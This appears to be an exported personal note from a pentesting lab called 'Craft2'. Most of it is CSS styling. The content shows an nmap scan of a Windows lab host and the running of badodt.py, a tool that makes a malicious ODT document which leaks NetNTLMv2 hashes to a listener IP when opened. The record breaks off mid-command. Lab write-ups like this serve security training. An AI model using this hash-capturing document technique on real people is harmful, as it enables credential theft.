@@ -1,0 +1,1179 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Craft2</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Craft2</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="craft2">Craft2</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.145.188 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 06:52 -0500
+Nmap scan report for 192.168.145.188
+Host is up (0.0072s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-title: Craft
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+49666/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-27T11:55:55
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT     ADDRESS
+1   5.16 ms 192.168.45.1
+2   4.99 ms 192.168.45.254
+3   6.39 ms 192.168.251.1
+4   6.56 ms 192.168.145.188
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.38 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.145.188 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 06:52 -0500
+Nmap scan report for 192.168.145.188
+Host is up (0.0072s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-title: Craft
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+49666/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-27T11:55:55
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT     ADDRESS
+1   5.16 ms 192.168.45.1
+2   4.99 ms 192.168.45.254
+3   6.39 ms 192.168.251.1
+4   6.56 ms 192.168.145.188
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.38 seconds</code></pre></div>
+<p>Use <code class="inline-code">badodt.py</code> to generate a ODT file to capture the NTLMv2 hash when the file is opened:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ python3 badodt.py --help                                                                                                             
+/home/kali/Desktop/Labs/Craft2/badodt.py:13: SyntaxWarning: invalid escape sequence &apos;\/&apos;
+  / __ )____ _____/ /     / __ \/ __ \/ ____/
+
+    ____            __      ____  ____  ______
+   / __ )____ _____/ /     / __ \/ __ \/ ____/
+  / __  / __ `/ __  /_____/ / / / / / / /_    
+ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
+/_____/\__,_/\__,_/      \____/_____/_/     
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy 
+@rd_pentest
+Python3 version by @gustanini
+www.secureyourit.co.uk
+
+
+Please enter IP of listener: 192.168.45.197
+/home/kali/Desktop/Labs/Craft2/bad.odt successfully created
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>Labs<span class="hljs-operator">/</span>Craft2]
+&boxur;&boxh;$ python3 badodt.py <span class="hljs-operator">-</span>-help                                                                                                             
